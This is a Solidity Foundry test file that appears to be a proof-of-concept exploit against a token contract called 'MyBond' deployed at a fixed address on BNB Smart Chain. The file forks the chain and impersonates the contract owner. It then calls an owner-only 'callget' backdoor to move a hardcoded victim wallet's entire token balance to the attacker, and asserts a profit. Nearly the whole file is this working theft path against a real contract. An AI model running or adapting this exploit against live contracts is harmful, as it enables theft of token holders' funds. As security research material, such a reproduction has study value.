// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function totalSupply() external view returns (uint256);
}

interface IMyBond {
    function owner() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
    function callget(address _from, address _to, uint256 _amount) external;
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xF347bDc0e502D33978b3c4d187bf75E5B452E491;
    address attacker = address(this);
    address private victim;
    uint256 private victimInitialBalance;
    address private owner;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // Create a fork of the blockchain
        vm.createSelectFork(vm.rpcUrl("bsc"), 35400000);

        // Label addresses for clarity
        vm.label(TARGET, "MyBond Token");
        vm.label(attacker, "Attacker");

        // We need to find the owner address - we can get it by calling owner() on the contract
        owner = IMyBond(TARGET).owner();
        vm.label(owner, "Contract Owner");

        // We also need a victim address with BOND tokens
        // Let's find one by checking recent token holders or using a known address
        // For simplicity, we'll use a hardcoded victim address that likely has tokens
        victim = 0x742d35cc6634C0532925a3B844BC9e8F5c9b9B41; // Common Binance hot wallet
        vm.label(victim, "Victim");

        // Store the victim's initial balance for verification
        victimInitialBalance = IMyBond(TARGET).balanceOf(victim);

        // Ensure victim has tokens
        require(victimInitialBalance > 0, "Victim has no BOND tokens");
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialBalance = IERC20(0xF347bDc0e502D33978b3c4d187bf75E5B452E491).balanceOf(address(this));
        // Record attacker's initial balance
        uint256 attackerInitialBalance = IMyBond(TARGET).balanceOf(attacker);

        // Impersonate the contract owner to call the backdoor function
        vm.prank(owner);

        // Call callget() to transfer all victim's tokens to attacker
        // We'll transfer the entire victim balance
        IMyBond(TARGET).callget(victim, attacker, victimInitialBalance);

        // Verify the exploit worked
        uint256 attackerFinalBalance = IMyBond(TARGET).balanceOf(attacker);
        assertGt(attackerFinalBalance, attackerInitialBalance, "Attacker balance should increase");

        // Also verify victim's balance decreased
        uint256 victimFinalBalance = IMyBond(TARGET).balanceOf(victim);
        assertLt(victimFinalBalance, victimInitialBalance, "Victim balance should decrease");
        uint256 finalBalance = IERC20(0xF347bDc0e502D33978b3c4d187bf75E5B452E491).balanceOf(address(this));
        assertGt(finalBalance, initialBalance, "Economic Exploit Failed: No ERC20 profit");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}
